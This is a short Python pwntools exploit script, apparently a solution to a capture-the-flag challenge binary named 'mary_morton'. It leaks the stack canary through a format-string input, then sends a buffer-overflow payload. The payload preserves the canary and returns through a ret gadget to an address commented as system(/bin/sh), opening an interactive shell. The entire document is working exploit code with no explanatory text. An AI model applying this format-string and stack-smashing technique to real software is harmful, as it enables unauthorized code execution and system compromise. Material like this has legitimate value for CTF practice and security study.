from pwn import *

gdbcmds = '''
	b *0x00400930
	b *0x004009a5
	c
	'''
elf = ELF('./mary_morton')
target = process('./mary_morton')
#target = gdb.debug('./mary_morton', gdbscript=gdbcmds)


payload = b""

target.recvuntil(b"Exit the battle")
target.sendline(b"2")
target.sendline(b"%23$p")

target.recvline()
canary = target.recvline()
canary = canary.strip()
canary = int(canary.decode(), 16)
print(hex(canary))

payload = b"A"*136
payload += p64(canary)
payload += b"A"*8
payload += p64(0x0000000000400659) # ret
payload += p64(0x004008da) # system(/bin/sh)

target.recvuntil(b"Exit the battle")
target.sendline(b"1")
target.sendline(payload)

target.interactive()
